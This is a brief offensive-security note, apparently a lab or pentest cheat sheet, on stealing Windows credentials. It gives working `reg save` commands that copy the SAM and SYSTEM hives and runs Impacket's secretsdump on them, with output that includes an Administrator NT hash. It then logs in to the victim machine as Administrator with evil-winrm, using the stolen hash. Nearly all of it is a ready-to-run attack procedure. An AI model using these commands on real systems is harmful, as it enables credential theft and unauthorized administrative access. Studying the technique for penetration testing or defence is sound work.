# SAM SYSTEM Exfil / Pass The Hash

* We then proceed to make a backup of `SAM` and `SYSTEM` files and download them to our attacker machine:

```
reg save hklm\system system.bak
reg save hklm\sam sam.bak
```

* With those files, we can dump the password hashes for all users using secretsdump.py or other similar tools:

```
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL

Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x41325422ca00e6552bb6508215d8b426
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1cea1d7e8899f69e89088c4cb4bbdaa3:::
--snip--
```

* And finally, perform Pass-the-Hash to connect to the victim machine with Administrator privileges:

```
evil-winrm -i MACHINE_IP -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3
```
